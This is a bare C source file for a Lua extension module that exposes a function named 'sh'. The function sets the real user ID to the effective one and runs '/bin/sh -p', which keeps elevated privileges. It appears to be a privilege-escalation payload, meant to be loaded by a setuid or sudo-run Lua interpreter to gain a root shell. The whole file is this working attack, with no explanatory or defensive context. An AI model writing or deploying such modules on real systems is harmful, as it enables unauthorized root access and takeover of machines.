#include "lua.h"
#include "lauxlib.h"
#include <unistd.h>

int sh(lua_State *L) {
    setuid(geteuid());
    char* argv[] = {"/bin/sh","-p",NULL}; // Start /bin/sh without dropping privs
    char* envp[] = {NULL};
    execve(argv[0], argv, envp);
    return 1;
}

static const struct luaL_Reg functions [] = {
    {"sh", sh},
    {NULL, NULL}
};

int luaopen_sh(lua_State *L) {
    lua_newtable(L);
    luaL_newlib (L, functions);
    lua_setglobal(L, "sh");
    return 1;
}
